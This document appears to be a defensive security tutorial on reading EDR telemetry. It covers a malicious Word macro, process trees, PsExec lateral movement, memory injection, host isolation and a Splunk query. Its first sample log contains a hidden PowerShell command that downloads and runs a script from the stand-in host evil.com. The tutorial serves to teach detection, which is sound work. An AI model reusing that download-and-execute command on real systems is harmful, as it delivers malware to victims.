
# 🦅 Understanding EDR Telemetry

Endpoint Detection and Response (EDR) tools provide a flight recorder for your endpoints. They capture everything a computer does.

## 

📝 The Raw Log

Below is a raw JSON log from an EDR agent (e.g., CrowdStrike/SentinelOne style).

COPY_CODE

```json
{
  "event_type": "ProcessRoleup2",
  "timestamp": "2024-03-15T10:45:22Z",
  "hostname": "FINANCE-PC-01",
  "user_name": "CORP\\asmith",
  "file_name": "powershell.exe",
  "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "command_line": "powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"",
  "parent_process": "winword.exe",
  "parent_command_line": ""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" C:\\Users\\asmith\\Downloads\\Invoice_UPDATED.docx",
  "sha256": "9f9d5187af9e..."
}
```

## 

🕵️‍♂️ Investigation Steps

### Step 1: Analyze the Hierarchy (Parent-Child)

- **Parent**: `winword.exe` (Microsoft Word)
    
- **Child**: `powershell.exe`
    
- **Analysis**: Word documents should **never** spawn PowerShell. This is a classic sign of a **Malicious Macro**.
    

### Step 2: Decode the Command Line

- `-nop`: NoProfile (Hides awareness from user).

- `-w hidden`: WindowStyle Hidden (User sees nothing).

- `IEX`: Invoke-Expression (Execute code).

- `DownloadString`: Fetch code from the internet.


### Step 3: Check the Context

- **User**: `asmith` (Finance Dept).

- **Document**: `Invoice_UPDATED.docx`.

- **Conclusion**: User opened a phishing email with a weaponized invoice.
# 🌳 Analyzing Process Trees

Visualizing the chain of execution is critical.

## 

📝 The Raw Log

A series of events joined by process ID (PID).

COPY_CODE

```text
[TIME: 14:00:01] PID: 1044 | svchost.exe (System Service)
    └── [TIME: 14:00:05] PID: 2055 | cmd.exe /c "whoami"
        └── [TIME: 14:00:06] PID: 3100 | conhost.exe
```

🕵️‍♂️ Investigation Steps
### Step 1: Identify the Root

- **Root**: `svchost.exe`. This is a generic Windows service host.
- **Issue**: `svchost.exe` launching `cmd.exe` is highly suspicious. It usually points to a compromised service (like a vulnerability in SMB or a web server running as system).

### Step 2: Check the Child Activity

- **Command**: `whoami`.
- **Context**: This is a "Discovery" command. Attackers run it immediately after getting shell access to see who they are (SYSTEM vs User).
### Step 3: The "Conhost"

- `conhost.exe` is normal when `cmd` runs. It handles the console window.
# 🦀 Detecting Lateral Movement

After compromising one machine, attackers move sideways to find the Crown Jewels (Domain Controller).

📝 The Raw Log (PsExec Event)

COPY_CODE

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <EventID>7045</EventID>
    <Computer>HR-LAPTOP-04</Computer>
  </System>
  <EventData>
    <Data Name='ServiceName'>PSEXESVC</Data>
    <Data Name='ImagePath'>%SystemRoot%\PSEXESVC.exe</Data>
    <Data Name='ServiceType'>user mode service</Data>
    <Data Name='StartType'>demand start</Data>
    <Data Name='AccountName'>LocalSystem</Data>
  </EventData>
</Event>
```


🕵️‍♂️ Investigation Steps

### Step 1: Analyze Event 7045

- **Event 7045**: A new service was installed.
    
- **ServiceName**: `PSEXESVC`.
    
- **Significance**: This is the default service name for **PsExec**, a tool often used by admins but LOVED by hackers for moving laterally.
    

### Step 2: Contextualize

- Did authorized IT staff deploy software at this time?
    
- If NO, an attacker effectively "remote controlled" this machine from another infected host.
    

### Step 3: Find the Source

- Look for successful network logins (Event 4624, Type 3) occurring just before this event to find the **Patient Zero** IP.
# 💉 Memory Injection Techniques

Fileless malware doesn't write to disk. It lives in RAM.

## 

📝 The Raw Log (Sysmon Event 8)

COPY_CODE

```json
{
  "event_id": 8,
  "desc": "CreateRemoteThread",
  "source_image": "C:\Users\Bob\AppData\Local\Temp\malware.exe",
  "target_image": "C:\Windows\System32\explorer.exe",
  "target_process_id": "4022",
  "start_address": "0xDEADBEEF"
}
```

## 

🕵️‍♂️ Investigation Steps

### Step 1: The "Injector"

- **Source**: `malware.exe` running from `Temp`.
    
- **State**: This is the malicious dropper.
    

### Step 2: The "Victim"

- **Target**: `explorer.exe`. This is the Windows desktop/file manager. It is _always_ running.
    
- **Action**: `CreateRemoteThread`. The source is forcing the target to run code.
    

### Step 3: The Result

- Once injected, `malware.exe` can delete itself.
    
- The malicious code now runs INSIDE `explorer.exe`.
    
- **Implication**: You will see `explorer.exe` making network connections to Russia. If you kill `explorer`, you kill the user's desktop session.
    

### 🛡️ Response

Do not just kill the process. Isolate the host and run memory forensics.

# 🛑 Isolating Infected Hosts

Time is money. The faster you act, the less damage occurs.


🕵️‍♂️ Investigation Steps

### Step 1: Verification

- **Action**: `NetworkContainment`.
    
- **Policy**: The log confirms that the host can ONLY talk to the EDR cloud (`allow_edr_cloud: true`). This is vital. You don't want to lose your own access!
    

### Step 2: What happens next?

- The attacker loses their C2 connection.
    
- **Active shells die**.
    
- **Data exfiltration stops**.
    
- The user sees "No Internet".
    

### Step 3: Remediation

1. **Live Response**: Connect via EDR shell.
    
2. **Collect Artifacts**: Get the `Invoice_UPDATED.docx` file.
    
3. **Re-image**: Wipe the machine. Better safe than sorry.
# 🔎 Writing SPL

Search Processing Language (SPL) is the standard for querying big data in Splunk.

## 

📝 The Scenario

Your boss says "Find all failed logins from China in the last 24 hours."

## 

📝 The Raw Query (SPL)

COPY_CODE

```splunk
index=main sourcetype=wineventlog:security EventCode=4625 
| iplocation SourceNetworkAddress 
| search Country="China"
| stats count by SourceNetworkAddress, User
| sort - count
```

## 

🕵️‍♂️ Investigation Steps

### Step 1: Filter Phase

- `index=main`: Search only the main storage.
    
- `EventCode=4625`: Windows Failed Identity.
    

### Step 2: Enrichment

- `iplocation`: Splunk automatically adds `Country`, `City`, `Lat`, `Lon` based on the IP address.
    

### Step 3: Aggregation

- `stats count by...`: Instead of showing 10,000 individual log lines, show me a table.
    
- **Row 1**: IP `1.2.3.4`, User `Admin`, Count `500`.
    
- **Conclusion**: We are under a brute force attack.
